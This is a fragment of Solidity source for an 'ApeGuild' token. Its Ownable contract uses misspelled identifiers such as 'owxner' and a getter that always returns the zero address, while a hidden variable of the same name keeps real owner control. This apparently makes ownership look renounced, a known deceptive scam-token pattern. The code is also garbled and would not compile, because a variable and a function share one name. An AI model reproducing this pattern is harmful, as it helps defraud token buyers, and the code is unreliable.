...
contract Ownable {
    address public owxner;

    event owneresshipTransferred(address indexed previousowneres, address indexed newowneres);

    modifier onlyowneres() {
        require(msg.sender == owxner);
        _;
    }

/**
    * @dev Returns the address of the current owxner.
     */
    function owxner() public pure returns (address) {
        return address(0);
    }
    ...
    function transferowneresship(address newowneres) public onlyowneres {
        ...
        emit owneresshipTransferred(owxner, newowneres);
        owxner = newowneres;
    }

    function renounceowneresship() public onlyowneres {
        emit owneresshipTransferred(owxner, address(0));
        owxner = address(0);
    }
}
...
contract BaseToken is Ownable {
    ...
    string constant public name = 'ApeGuild';

    string constant public symbol = 'ApeGD';
    ...
    event Approval(address indexed owxner, address indexed spender, uint256 value);
